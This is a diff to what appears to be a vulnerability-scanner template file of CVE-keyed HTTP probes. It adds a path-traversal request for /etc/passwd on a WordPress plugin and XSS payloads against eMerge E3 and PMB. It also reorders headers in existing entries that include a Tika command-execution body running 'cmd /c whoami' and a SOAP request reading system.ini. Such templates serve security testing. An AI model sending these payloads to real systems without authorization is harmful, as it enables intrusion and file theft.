@@ -4036,6 +4036,21 @@
       ]
     },
     {
+      "id": "CVE-2015-5469",
+      "info": {
+        "name": "Wordpress MDC YouTube Downloader plugin v2.1.0 - Remote file download",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=/etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2015-5471",
       "info": {
         "name": "Swim Team <= v1.44.10777 - Local File Inclusion",
@@ -6605,11 +6620,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -9941,6 +9956,21 @@
       ]
     },
     {
+      "id": "CVE-2019-7255",
+      "info": {
+        "name": "Linear eMerge E3 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/badging/badge_template_v0.php?layout=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-7256",
       "info": {
         "name": "eMerge E3 1.00-06 - Remote Code Execution",
@@ -11980,9 +12010,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
           },
           "method": "POST",
           "path": [
@@ -20818,6 +20848,21 @@
         {
           "raw": [
             "GET /cgi-bin/ExportLogs.sh HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-34328",
+      "info": {
+        "name": "PMB 7.3.10 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?lvl=author_see&id=42691%27%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
